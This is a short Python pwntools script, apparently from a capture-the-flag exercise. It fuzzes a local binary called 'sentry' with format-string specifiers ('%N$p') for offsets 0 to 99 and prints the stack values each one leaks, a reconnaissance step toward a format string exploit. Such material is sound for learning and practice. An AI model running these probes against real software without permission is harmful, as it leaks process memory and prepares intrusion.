from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('sentry')

# Let's fuzz x values
for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter(b': ','%{}$p'.format(i).encode())
        result = p.recvline().decode()
        if result:
            print('[*] '+str(i) + ':\t' + str(result.split(':')[1]).strip())
    except EOFError:
        pass
